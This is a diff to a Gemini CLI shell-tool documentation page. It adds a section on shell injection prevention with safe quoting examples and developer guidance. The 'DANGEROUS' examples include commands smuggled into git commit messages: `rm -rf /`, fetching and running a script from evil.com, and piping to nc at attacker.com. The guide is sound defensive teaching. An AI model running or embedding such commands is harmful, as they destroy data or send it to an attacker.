@@ -55,7 +55,7 @@ run_shell_command(command="npm run dev &", description="Start development server
 
 ## Important notes
 
-- **Security:** Be cautious when executing commands, especially those constructed from user input, to prevent security vulnerabilities.
+- **Security:** Be cautious when executing commands, especially those constructed from user input, to prevent security vulnerabilities. See the [Security Best Practices](#security-best-practices) section below.
 - **Interactive commands:** Avoid commands that require interactive user input, as this can cause the tool to hang. Use non-interactive flags if available (e.g., `npm init -y`).
 - **Error handling:** Check the `Stderr`, `Error`, and `Exit Code` fields to determine if a command executed successfully.
 - **Background processes:** When a command is run in the background with `&`, the tool will return immediately and the process will continue to run in the background. The `Background PIDs` field will contain the process ID of the background process.
@@ -136,3 +136,59 @@ To block all shell commands, add the `run_shell_command` wildcard to `excludeToo
 Command-specific restrictions in
 `excludeTools` for `run_shell_command` are based on simple string matching and can be easily bypassed. This feature is **not a security mechanism** and should not be relied upon to safely execute untrusted code. It is recommended to use `coreTools` to explicitly select commands
 that can be executed.
+
+## Security Best Practices
+
+### Shell Injection Prevention
+
+Gemini CLI implements automatic shell escaping to prevent command injection vulnerabilities. When constructing commands with user input or special characters, the AI model is instructed to properly escape all arguments.
+
+#### Common Attack Vectors
+
+Special characters in shell commands can lead to command injection:
+
+```bash
+# DANGEROUS - Backticks execute commands
+git commit -m "Fix `rm -rf /` bug"     # Would execute rm command!
+
+# DANGEROUS - Dollar sign command substitution  
+git commit -m "Update $(curl evil.com/script | sh)"
+
+# DANGEROUS - Semicolon allows command chaining
+git commit -m "Fix bug; rm -rf /"
+
+# DANGEROUS - Pipe allows command piping
+git commit -m "Fix bug | nc attacker.com 1337"
+```
+
+#### Safe Command Construction
+
+Gemini CLI automatically escapes special characters using single quotes:
+
+```bash
+# SAFE - Single quotes prevent all expansions
+git commit -m 'Fix `ComponentName` rendering issue'
+
+# SAFE - Properly escaped single quote
+git commit -m 'Fix Mary'\''s code'  
+
+# SAFE - Special characters are literal
+git commit -m 'Update $USER config @ $(date)'
+```
+
+#### Implementation Details
+
+1. **Single Quote Protection**: Single quotes provide the strongest protection in bash/sh, preventing ALL expansions except the single quote itself
+2. **Escape Pattern**: Single quotes within strings use the `'\''` pattern (end quote, escaped quote, start quote)
+3. **Automatic Escaping**: The AI model is trained to automatically apply proper escaping to all shell arguments containing special characters
+
+#### For Developers
+
+When extending Gemini CLI with new shell command features:
+
+1. Always use the `escapeShellArg()` utility from `@google/gemini-cli-core` for user input
+2. Never use `eval` or similar dangerous constructs
+3. Prefer Node.js APIs over shell commands when possible
+4. Add security-focused tests for any new shell functionality
+
+For more details, see the [Shell Injection Prevention Guide](/docs/security/shell-injection-prevention.md).
